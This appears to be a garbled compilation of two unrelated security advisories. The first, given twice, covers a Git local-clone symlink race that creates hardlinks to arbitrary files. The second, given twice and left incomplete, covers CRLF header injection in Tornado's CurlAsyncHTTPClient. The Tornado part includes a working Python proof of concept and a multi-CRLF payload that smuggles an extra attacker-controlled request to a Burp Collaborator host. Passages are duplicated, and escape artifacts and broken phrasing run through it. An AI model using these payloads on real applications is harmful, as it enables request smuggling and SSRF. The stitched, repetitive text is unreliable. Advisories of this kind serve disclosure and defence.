Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, when cloning a local source repository that contains symlinks via the filesystem, Git may create hardlinks to arbitrary user-readable files on the same filesystem as the target repository in the `objects/` directory. Cloning a local repository over the filesystem may creating hardlinks to arbitrary user-owned files on the same filesystem in the target Git repository\u0026#39;s `objects/` directory. When cloning a repository over the filesystem (without explicitly specifying the `file://` protocol or `--no-local`), the optimizations for local cloning\nwill be used, which include attempting to hard link the object files instead of copying them. While the code includes checks against symbolic links in the source repository, which were added during the fix for CVE-2022-39253, these checks can still be raced because the hard link operation ultimately follows symlinks. If the object on the filesystem appears as a file during the check, and then a symlink during the operation, this will allow the adversary to bypass the check and create hardlinks in the destination objects directory to arbitrary, user-readable files.

Prior to versions 2.45.1, 2.44.1, 2.43.4, 2.42.2, 2.41.1, 2.40.2, and 2.39.4, when cloning a local source repository that contains symlinks via the filesystem, Git may create hardlinks to arbitrary user-readable files on the same filesystem as the target repository in the `objects/` directory. Cloning a local repository over the filesystem may creating hardlinks to arbitrary user-owned files on the same filesystem in the target Git repository's `objects/` directory. When cloning a repository over the filesystem (without explicitly specifying the `file://` protocol or `--no-local`), the optimizations for local cloning\nwill be used, which include attempting to hard link the object files instead of copying them. While the code includes checks against symbolic links in the source repository, which were added during the fix for CVE-2022-39253, these checks can still be raced because the hard link operation ultimately follows symlinks. If the object on the filesystem appears as a file during the check, and then a symlink during the operation, this will allow the adversary to bypass the check and create hardlinks in the destination objects directory to arbitrary, user-readable files.

As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl\u0026#39;s (as well as pycurl\u0026#39;s) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n\u0026gt; The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \u0026#34;http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\u0026#34;,\n        method=\u0026#34;POST\u0026#34;,\n        body=\u0026#34;body\u0026#34;,\n        # Injected header using CRLF characters\n        headers={\u0026#34;Foo\u0026#34;: \u0026#34;Bar\\r\\nHeader: Injected\u0026#34;}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \u0026#34;__main__\u0026#34;:\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences. For example, specifying a header value of `\\r\\n\\r\\nPOST /attacker-controlled-url HTTP/1.1\\r\\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com` results in the server receiving an additional, attacker-controlled request:\n\n```http\nPOST /attacker-controlled-url HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\n### Impact\nApplications using the Tornado library to send HTTP requests with untrusted header data are affected. This issue may facilitate the exploitation of server-side request forgery (SSRF) vulnerabilities."

As a result, if an application includes an attacker-controlled header value in a request sent using `CurlAsyncHTTPClient`, the attacker can inject arbitrary headers into the request or cause the application to send arbitrary requests to the specified server.\n\nThis behavior differs from that of the standard `AsyncHTTPClient` class, which does reject CRLF characters.\n\nThis issue appears to stem from libcurl's (as well as pycurl's) lack of validation for the [`HTTPHEADER`](https://curl.se/libcurl/c/CURLOPT_HTTPHEADER.html) option. libcurl’s documentation states:\n\n\u003e The headers included in the linked list must not be CRLF-terminated, because libcurl adds CRLF after each header item itself. Failure to comply with this might result in strange behavior. libcurl passes on the verbatim strings you give it, without any filter or other safe guards. That includes white space and control characters.\n\npycurl similarly appears to assume that the headers adhere to the correct format. Therefore, without any validation on Tornado’s part, header names and values are included verbatim in the request sent by `CurlAsyncHTTPClient`, including any control characters that have special meaning in HTTP semantics.\n\n### PoC\nThe issue can be reproduced using the following script:\n\n```python\nimport asyncio\n\nfrom tornado import httpclient\nfrom tornado import curl_httpclient\n\nasync def main():\n    http_client = curl_httpclient.CurlAsyncHTTPClient()\n\n    request = httpclient.HTTPRequest(\n        # Burp Collaborator payload\n        \"http://727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com/\",\n        method=\"POST\",\n        body=\"body\",\n        # Injected header using CRLF characters\n        headers={\"Foo\": \"Bar\\r\\nHeader: Injected\"}\n    )\n\n    response = await http_client.fetch(request)\n    print(response.body)\n\n    http_client.close()\n\nif __name__ == \"__main__\":\n    asyncio.run(main())\n```\n\nWhen the specified server receives the request, it contains the injected header (`Header: Injected`) on its own line:\n\n```http\nPOST / HTTP/1.1\nHost: 727ymeu841qydmnwlol261ktkkqbe24qt.oastify.com\nUser-Agent: Mozilla/5.0 (compatible; pycurl)\nAccept: */*\nAccept-Encoding: gzip,deflate\nFoo: Bar\nHeader: Injected\nContent-Length: 4\nContent-Type: application/x-www-form-urlencoded\n\nbody\n```\n\nThe attacker can also construct entirely new requests using a payload with multiple CRLF sequences.
